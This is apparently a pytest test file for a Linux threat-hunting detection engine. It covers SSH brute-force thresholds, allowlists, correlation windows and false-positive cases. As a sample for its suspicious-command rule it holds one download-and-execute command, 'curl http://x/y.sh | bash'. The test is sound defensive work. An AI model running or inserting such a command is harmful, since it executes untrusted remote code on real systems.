"""Detection logic, thresholds, windows, allowlists, correlation, false-positive scenarios."""

import copy
from collections.abc import Callable
from typing import Any

from linux_threat_hunter.rules_engine import Engine


def run(rules: list[Any], config: dict[str, Any], ev: Any, iocs: Any = None, diff: Any = None) -> Any:
    return Engine(rules, config, iocs, diff).run(ev)


def by_rule(result: Any, rule_id: str) -> list[Any]:
    return [f for f in result.findings if f.rule_id == rule_id]


def proc(pid: int, name: str, exe: str, **kw: Any) -> dict[str, Any]:
    return {
        "pid": pid,
        "ppid": kw.pop("ppid", 1),
        "name": name,
        "user": "alice",
        "exe": exe,
        "cmdline": kw.pop("cmdline", name),
        "kernel_thread": False,
        **kw,
    }


def fails(n: int, start_min: int = 0, gap_s: int = 10, ip: str = "198.51.100.23") -> str:
    lines = []
    for i in range(n):
        t = start_min * 60 + i * gap_s
        lines.append(
            f"Oct 14 03:{t // 60 % 60:02d}:{t % 60:02d} h sshd[1]: Failed password for root from {ip} port {1000 + i} ssh2"
        )
    return "\n".join(lines) + "\n"


def test_writable_location_rule_and_false_positive_scenarios(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    ev = make_evidence(
        processes=[
            proc(10, "bad", "/tmp/.x/bad"),
            proc(11, "ok", "/usr/bin/ok"),
            proc(12, "tmpwatch", "/tmpfoo/tmpwatch"),
            proc(13, "kthreadd", "/dev/shm/x", kernel_thread=True),
            proc(14, "cache", "/home/bob/.cache/tool/run"),
        ]
    )
    res = run(rules, config, ev)
    hits = {f.entities["pid"] for f in by_rule(res, "LTH-PROC-001")}
    assert hits == {10, 14}  # /tmpfoo is not /tmp; kernel threads are excluded
    f = by_rule(res, "LTH-PROC-001")[0]
    assert f.evidence_source == "processes.json" and f.evidence["record_ref"].startswith("processes.json#")
    assert f.severity == "medium" and f.confidence == "medium" and f.classification == "heuristic"
    assert f.false_positives and f.investigation_steps and f.rationale


def test_allowlist_suppresses_and_is_counted(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    ev = make_evidence(processes=[proc(10, "AppRun", "/tmp/.mount_x/AppRun"), proc(11, "bad", "/tmp/bad")])
    cfg = copy.deepcopy(config)
    cfg["allowlists"] = {"LTH-PROC-001": [{"field": "exe", "op": "startswith", "value": "/tmp/.mount_"}]}
    res = run(rules, cfg, ev)
    assert [f.entities["pid"] for f in by_rule(res, "LTH-PROC-001")] == [11]
    status = next(s for s in res.statuses if s.rule_id == "LTH-PROC-001")
    assert status.suppressed == 1
    cfg["allowlists"] = {"*": [{"field": "user", "op": "equals", "value": "alice"}]}
    assert not by_rule(run(rules, cfg, ev), "LTH-PROC-001")


def test_invalid_allowlist_is_rejected(rules: list[Any], config: dict[str, Any]) -> None:
    import pytest

    from linux_threat_hunter.rules_engine.conditions import ConditionError

    cfg = copy.deepcopy(config)
    cfg["allowlists"] = {"*": [{"field": "x", "op": "regex", "value": "(a+)+$"}]}
    with pytest.raises(ConditionError):
        Engine(rules, cfg)


def test_parent_child_rule(make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]) -> None:
    ev = make_evidence(
        processes=[
            proc(1, "nginx", "/usr/sbin/nginx", ppid=0),
            proc(2, "sh", "/bin/dash", ppid=1),
            proc(3, "bash", "/bin/bash", ppid=99),  # parent invisible: must not fire
            proc(4, "sh", "/bin/dash", ppid=5),
            proc(5, "bash", "/bin/bash", ppid=0),  # shell under shell: fine
        ]
    )
    hits = by_rule(run(rules, config, ev), "LTH-PROC-003")
    assert [f.entities["pid"] for f in hits] == [2]


def test_threshold_boundaries(make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]) -> None:
    assert not by_rule(run(rules, config, make_evidence(auth=fails(4))), "LTH-AUTH-001")  # below threshold
    res = run(rules, config, make_evidence(auth=fails(5)))
    f = by_rule(res, "LTH-AUTH-001")
    assert len(f) == 1 and f[0].evidence["count"] == 5 and f[0].entities["ip"] == "198.51.100.23"
    # spread wider than the window: 5 failures but 100 s apart each (> 300 s total)
    assert not by_rule(run(rules, config, make_evidence(auth=fails(5, gap_s=100))), "LTH-AUTH-001")
    # groups do not mix: 3 + 3 from different addresses
    mixed = fails(3, ip="1.1.1.1") + fails(3, start_min=1, ip="2.2.2.2")
    assert not by_rule(run(rules, config, make_evidence(auth=mixed)), "LTH-AUTH-001")


def test_threshold_override_and_windows(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    cfg = copy.deepcopy(config)
    cfg["rule_overrides"] = {"LTH-AUTH-001": {"params": {"count": 3}, "severity": "high"}}
    f = by_rule(run(rules, cfg, make_evidence(auth=fails(3))), "LTH-AUTH-001")
    assert len(f) == 1 and f[0].severity == "high"
    cfg["rule_overrides"] = {"LTH-AUTH-001": {"enabled": False}}
    res = run(rules, cfg, make_evidence(auth=fails(9)))
    assert next(s for s in res.statuses if s.rule_id == "LTH-AUTH-001").status == "skipped"


def test_threshold_ignores_events_without_timestamps(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    bad = "".join(f"Oct 99 99:99:99 h sshd[1]: Failed password for root from 9.9.9.9 port {i} ssh2\n" for i in range(8))
    res = run(rules, config, make_evidence(auth=bad))
    st = next(s for s in res.statuses if s.rule_id == "LTH-AUTH-001")
    assert not res.findings or not by_rule(res, "LTH-AUTH-001")
    assert any("no usable timestamp" in n for n in st.notes)


def test_success_after_failures_sequence(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    ok = "Oct 14 03:01:00 h sshd[2]: Accepted password for deploy from 198.51.100.23 port 22 ssh2\n"
    res = run(rules, config, make_evidence(auth=fails(6) + ok))
    f = by_rule(res, "LTH-AUTH-002")
    assert len(f) == 1 and f[0].evidence["failures"] == 6 and f[0].entities["user"] == "deploy"
    assert "does not prove" in f[0].rationale  # wording: no claim of compromise
    # success BEFORE failures does not match
    late_fail = ok + fails(6, start_min=5)
    assert not by_rule(run(rules, config, make_evidence(auth=late_fail)), "LTH-AUTH-002")
    # success from a different source does not match
    other = "Oct 14 03:01:00 h sshd[2]: Accepted password for deploy from 192.0.2.1 port 22 ssh2\n"
    assert not by_rule(run(rules, config, make_evidence(auth=fails(6) + other)), "LTH-AUTH-002")
    # success long after (outside 900 s window)
    far = "Oct 14 05:00:00 h sshd[2]: Accepted password for deploy from 198.51.100.23 port 22 ssh2\n"
    assert not by_rule(run(rules, config, make_evidence(auth=fails(6) + far)), "LTH-AUTH-002")


def test_correlation_window_and_identifiers(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    ok = "Oct 14 03:02:00 h sshd[2]: Accepted password for deploy from 198.51.100.23 port 22 ssh2\n"
    res = run(rules, config, make_evidence(auth=fails(6) + ok))
    cor = by_rule(res, "LTH-COR-001")
    assert len(cor) == 1 and len(cor[0].related_findings) == 2
    assert cor[0].classification == "correlation" and cor[0].evidence["join"] == {"ip": "198.51.100.23"}
    # Outside the 1800 s correlation window: both rules fire but are NOT linked
    far = "Oct 14 03:50:00 h sshd[2]: Accepted password for deploy from 198.51.100.23 port 22 ssh2\n"
    cfg = copy.deepcopy(config)
    cfg["rule_overrides"] = {"LTH-AUTH-002": {"params": {"window_seconds": 7200}}}
    res2 = run(rules, cfg, make_evidence(auth=fails(6) + far))
    assert by_rule(res2, "LTH-AUTH-002") and not by_rule(res2, "LTH-COR-001")


def test_correlation_requires_shared_identifier(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    net = [
        {
            "proto": "tcp",
            "state": "ESTAB",
            "local_addr": "10.0.0.1",
            "local_port": 1,
            "remote_addr": "8.8.8.8",
            "remote_port": 443,
            "listening": False,
            "pid": 99,
            "process": "x",
        }
    ]
    ev = make_evidence(processes=[proc(10, "bad", "/tmp/bad"), proc(99, "x", "/tmp/x2")], network=net)
    res = run(rules, config, ev)
    cor = by_rule(res, "LTH-COR-003")
    assert len(cor) == 1 and cor[0].evidence["join"] == {"pid": 99}  # pid 10 has no socket: not linked


def test_sudo_and_baseline_rules(make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]) -> None:
    log = (
        "Oct 14 03:13:05 h sudo:   deploy : TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/bin/bash\n"
        "Oct 14 03:14:05 h sudo:   deploy : TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt update\n"
    )
    res = run(rules, config, make_evidence(auth=log))
    hits = by_rule(res, "LTH-AUTH-004")
    assert len(hits) == 1 and hits[0].severity == "low" and hits[0].confidence == "low"


def test_missing_executable_unknown_is_not_missing(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    def unit(path: str, exists: Any) -> dict[str, Any]:
        d: dict[str, Any] = {"kind": "systemd_service", "path": path, "content": "[Service]\nExecStart=/opt/a/run\n"}
        if exists is not None:
            d["referenced_paths_exist"] = {"/opt/a/run": exists}
        return d

    ev = make_evidence(
        persistence=[
            unit("/etc/systemd/system/a.service", False),
            unit("/etc/systemd/system/b.service", True),
            unit("/etc/systemd/system/c.service", None),
        ]
    )
    paths = [f.evidence["path"] for f in by_rule(run(rules, config, ev), "LTH-PERS-002")]
    assert paths == ["/etc/systemd/system/a.service"]


def test_skipped_rules_report_reasons(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    res = run(rules, config, make_evidence(processes=[proc(1, "init", "/sbin/init")]))
    st = {s.rule_id: s for s in res.statuses}
    assert st["LTH-AUTH-001"].status == "skipped" and "no auth telemetry" in st["LTH-AUTH-001"].reason
    assert "no baseline" in st["LTH-PERS-001"].reason and "no IOC file" in st["LTH-PROC-002"].reason
    assert st["LTH-PROC-001"].status == "executed"


def test_findings_cap(make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]) -> None:
    cfg = copy.deepcopy(config)
    cfg["limits"]["max_findings_per_rule"] = 3
    ev = make_evidence(processes=[proc(i, "p", f"/tmp/p{i}") for i in range(10, 20)])
    res = run(rules, cfg, ev)
    assert len(by_rule(res, "LTH-PROC-001")) == 3
    assert any("capped" in n for n in next(s for s in res.statuses if s.rule_id == "LTH-PROC-001").notes)


def test_finding_ids_are_stable(make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]) -> None:
    ev = make_evidence(processes=[proc(10, "bad", "/tmp/bad")])
    a = [f.id for f in run(rules, config, ev).findings]
    b = [f.id for f in run(rules, config, ev).findings]
    assert a == b and all(i.startswith("LTH-F-") for i in a)


def test_event_pattern_rule_uses_configurable_patterns(
    make_evidence: Callable[..., Any], rules: list[Any], config: dict[str, Any]
) -> None:
    ev = make_evidence(
        events=[
            {"timestamp": "2025-10-14T03:15:10Z", "user": "u", "command": "curl http://x/y.sh | bash"},
            {"timestamp": "2025-10-14T03:15:11Z", "user": "u", "command": "ls -la"},
        ]
    )
    assert len(by_rule(run(rules, config, ev), "LTH-PROC-006")) == 1
    cfg = copy.deepcopy(config)
    cfg["variables"]["suspicious_command_patterns"] = [r"^ls\b"]
    assert [f.evidence["command"] for f in by_rule(run(rules, cfg, ev), "LTH-PROC-006")] == ["ls -la"]
